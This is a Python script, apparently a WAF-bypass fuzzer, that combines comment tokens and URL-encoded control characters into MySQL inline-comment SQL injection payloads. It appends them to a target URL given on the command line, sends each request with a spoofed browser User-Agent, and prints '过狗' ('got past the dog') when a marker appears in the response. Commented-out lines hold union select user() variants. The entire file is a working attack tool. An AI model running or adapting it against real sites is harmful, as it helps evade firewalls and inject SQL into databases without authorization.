# encoding=utf-8
import requests
import sys
import time
url = sys.argv[1];
Fuzz_a = ['/*!', '*/', '/**/', '/', '?', '~', '!', '.', '%', '-', '*', '+', '=']
Fuzz_b = ['']
Fuzz_c = ['%0a', '%0b', '%0c', '%0d', '%0e', '%0f', '%0h', '%0i', '%0j']
FUZZ = Fuzz_a + Fuzz_b + Fuzz_c
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}
for a in FUZZ:
    pass
    for b in FUZZ:
            pass
            for c in FUZZ:
                    for d in FUZZ:
                        pass
                        for e in FUZZ:
                            pass
                            #PYLOAD = "/*!union" + a + b + c + d + e + "select*/"+a + b + c + d + e +"/*!user"+a + b + c + d + e +"()*/"+",2"
                            #PYLOAD="/*!union"+a + b + c + d + e+"select*//*! user"+a + b + c + d + e+"()*/,2,3"
                            PYLOAD="/*! and"+a + b + c + d + e+" 1 = 1*/"
                            url_payload = url + PYLOAD
                            time.sleep(1)
                            response = requests.get(url_payload, headers=header)
                            if '15:24:42' in response.text:
                                print("[*]URL:" + url_payload + "过狗！")
                                # f = open('result.txt', 'a')
                                # f.write(urlp + "\n")
                                # f.close
                            else:
                                print("没过鸭")
